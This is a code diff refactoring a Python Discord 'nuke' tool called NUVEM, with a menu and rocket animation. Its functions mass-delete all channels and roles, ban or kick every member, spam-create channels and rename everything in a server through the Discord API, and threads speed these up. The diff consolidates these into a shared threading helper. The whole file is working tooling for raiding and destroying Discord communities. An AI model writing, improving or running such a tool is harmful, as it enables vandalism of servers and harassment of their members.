@@ -3,21 +3,16 @@ import sys
 import time
 import requests
 import threading
-import asyncio
-import itertools
 from colorama import init, Fore, Style
 
 init(autoreset=True)
 
 API_BASE = "https://discord.com/api/v9"
-
 DELAY = 0.004
 
-# Utility for clear screen
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-# RGB devilish color cycle generator
 def devil_rgb_cycle():
     colors = [Fore.RED, Fore.MAGENTA, Fore.YELLOW]
     while True:
@@ -30,7 +25,6 @@ def rgb_print(text):
     c = next(color_cycle)
     print(c + text + Style.RESET_ALL)
 
-# Input with validation
 def get_input(prompt, validate=lambda x: True):
     while True:
         val = input(prompt)
@@ -38,7 +32,6 @@ def get_input(prompt, validate=lambda x: True):
             return val
         print(Fore.RED + "Invalid input! Try again.")
 
-# Rocket launch animation
 def rocket_animation():
     rocket_frames = [
         "    ^\n   / \\\n   | |\n   | |\n  /|_|\\\n  |   |\n  |___|",
@@ -50,7 +43,7 @@ def rocket_animation():
         " \n \n \n \n \n \n ",
     ]
     clear()
-    for i in range(3):
+    for _ in range(3):
         for frame in rocket_frames:
             clear()
             rgb_print(frame)
@@ -74,21 +67,17 @@ class NuvemNuker:
         r = self.session.get(self.api_url(f"/guilds/{self.guild_id}/channels"))
         if r.status_code == 200:
             return r.json()
-        else:
-            rgb_print(f"Failed to fetch channels. Status: {r.status_code}")
-            return []
+        rgb_print(f"Failed to fetch channels. Status: {r.status_code}")
+        return []
 
     def get_roles(self):
         r = self.session.get(self.api_url(f"/guilds/{self.guild_id}/roles"))
         if r.status_code == 200:
             return r.json()
-        else:
-            rgb_print(f"Failed to fetch roles. Status: {r.status_code}")
-            return []
+        rgb_print(f"Failed to fetch roles. Status: {r.status_code}")
+        return []
 
     def get_members(self):
-        # Discord API does not allow bulk fetch of members via bot easily.
-        # So we try to get members by chunks via /guilds/{guild_id}/members?limit=100&after={user_id}
         members = []
         after = None
         while True:
@@ -136,7 +125,17 @@ class NuvemNuker:
         r = self.session.patch(self.api_url(f"/guilds/{self.guild_id}/roles/{role_id}"), json={"name": new_name})
         return r.status_code == 200
 
-async def main():
+def run_threads(target, items):
+    threads = []
+    for item in items:
+        t = threading.Thread(target=target, args=(item,))
+        t.start()
+        threads.append(t)
+        time.sleep(DELAY)
+    for t in threads:
+        t.join()
+
+def main():
     clear()
     rgb_print("🔥🔥🔥 WELCOME TO NUVEM DEVIL NUKE TOOL 🔥🔥🔥\n")
 
@@ -147,7 +146,6 @@ async def main():
 
     while True:
         clear()
-        # Devil RGB Menu with cycling colors
         rgb_print("=== NUVEM Devil Menu ===")
         print(f"{Fore.RED}01{Fore.RESET}. Delete All Channels")
         print(f"{Fore.RED}02{Fore.RESET}. Delete All Roles")
@@ -160,63 +158,110 @@ async def main():
 
         choice = get_input(Fore.YELLOW + "Choose an option (1-8): ", lambda x: x in [str(i) for i in range(1, 9)])
 
-        # Rocket animation before executing choice
         rocket_animation()
 
         if choice == "1":
             channels = nuker.get_channels()
             rgb_print(f"Deleting {len(channels)} channels...")
-            threads = []
-            for ch in channels:
-                def delete_thread(channel_id):
-                    if nuker.delete_channel(channel_id):
-                        rgb_print(f"Deleted channel ID: {channel_id}")
-                    else:
-                        rgb_print(f"Failed to delete channel ID: {channel_id}")
-                    time.sleep(DELAY)
 
-                t = threading.Thread(target=delete_thread, args=(ch['id'],))
-                t.start()
-                threads.append(t)
-            for t in threads:
-                t.join()
+            def delete_channel_thread(ch):
+                if nuker.delete_channel(ch['id']):
+                    rgb_print(f"Deleted channel: {ch['name']} ({ch['id']})")
+                else:
+                    rgb_print(f"Failed to delete channel: {ch['name']} ({ch['id']})")
+
+            run_threads(delete_channel_thread, channels)
             input(Fore.GREEN + "Finished deleting channels! Press Enter to continue.")
 
         elif choice == "2":
             roles = nuker.get_roles()
             rgb_print(f"Deleting {len(roles)} roles...")
-            threads = []
-            for role in roles:
-                if role['id'] == guild_id:  # skip @everyone role
-                    continue
-                def delete_thread(role_id):
-                    if nuker.delete_role(role_id):
-                        rgb_print(f"Deleted role ID: {role_id}")
-                    else:
-                        rgb_print(f"Failed to delete role ID: {role_id}")
-                    time.sleep(DELAY)
 
-                t = threading.Thread(target=delete_thread, args=(role['id'],))
-                t.start()
-                threads.append(t)
-            for t in threads:
-                t.join()
+            def delete_role_thread(role):
+                # Skip @everyone role
+                if role['id'] == nuker.guild_id:
+                    return
+                if nuker.delete_role(role['id']):
+                    rgb_print(f"Deleted role: {role['name']} ({role['id']})")
+                else:
+                    rgb_print(f"Failed to delete role: {role['name']} ({role['id']})")
+
+            run_threads(delete_role_thread, roles)
             input(Fore.GREEN + "Finished deleting roles! Press Enter to continue.")
 
         elif choice == "3":
             members = nuker.get_members()
             rgb_print(f"Banning {len(members)} members...")
-            threads = []
-            for m in members:
-                user_id = m['user']['id']
-                def ban_thread(uid):
-                    if nuker.ban_member(uid):
-                        rgb_print(f"Banned user ID: {uid}")
-                    else:
-                        rgb_print(f"Failed to ban user ID: {uid}")
-                    time.sleep(DELAY)
 
-                t = threading.Thread(target=ban_thread, args=(user_id,))
-                t.start()
-                threads.append(t)
-            for t in threads:
+            def ban_thread(member):
+                uid = member['user']['id']
+                if nuker.ban_member(uid):
+                    rgb_print(f"Banned user ID: {uid}")
+                else:
+                    rgb_print(f"Failed to ban user ID: {uid}")
+
+            run_threads(ban_thread, members)
+            input(Fore.GREEN + "Finished banning members! Press Enter to continue.")
+
+        elif choice == "4":
+            members = nuker.get_members()
+            rgb_print(f"Kicking {len(members)} members...")
+
+            def kick_thread(member):
+                uid = member['user']['id']
+                if nuker.kick_member(uid):
+                    rgb_print(f"Kicked user ID: {uid}")
+                else:
+                    rgb_print(f"Failed to kick user ID: {uid}")
+
+            run_threads(kick_thread, members)
+            input(Fore.GREEN + "Finished kicking members! Press Enter to continue.")
+
+        elif choice == "5":
+            amount = get_input(Fore.YELLOW + "How many channels to create? ", lambda x: x.isdigit() and int(x) > 0)
+            amount = int(amount)
+            rgb_print(f"Creating {amount} channels...")
+
+            def create_channel_thread(_):
+                if nuker.create_channel("nuvem-channel"):
+                    rgb_print(f"Created channel nuvem-channel")
+                else:
+                    rgb_print(f"Failed to create channel")
+
+            run_threads(create_channel_thread, range(amount))
+            input(Fore.GREEN + "Finished creating channels! Press Enter to continue.")
+
+        elif choice == "6":
+            channels = nuker.get_channels()
+            new_name = get_input(Fore.YELLOW + "Enter new name for all channels: ", lambda x: len(x) > 0)
+            rgb_print(f"Renaming {len(channels)} channels to '{new_name}'...")
+
+            def rename_channel_thread(ch):
+                if nuker.rename_channel(ch['id'], new_name):
+                    rgb_print(f"Renamed channel {ch['name']} to {new_name}")
+                else:
+                    rgb_print(f"Failed to rename channel {ch['name']}")
+
+            run_threads(rename_channel_thread, channels)
+            input(Fore.GREEN + "Finished renaming channels! Press Enter to continue.")
+
+        elif choice == "7":
+            roles = nuker.get_roles()
+            new_name = get_input(Fore.YELLOW + "Enter new name for all roles: ", lambda x: len(x) > 0)
+            rgb_print(f"Renaming {len(roles)} roles to '{new_name}'...")
+
+            def rename_role_thread(role):
+                if nuker.rename_role(role['id'], new_name):
+                    rgb_print(f"Renamed role {role['name']} to {new_name}")
+                else:
+                    rgb_print(f"Failed to rename role {role['name']}")
+
+            run_threads(rename_role_thread, roles)
+            input(Fore.GREEN + "Finished renaming roles! Press Enter to continue.")
+
+        elif choice == "8":
+            rgb_print("Exiting NUVEM... Goodbye!")
+            break
+
+if __name__ == "__main__":
+    main()
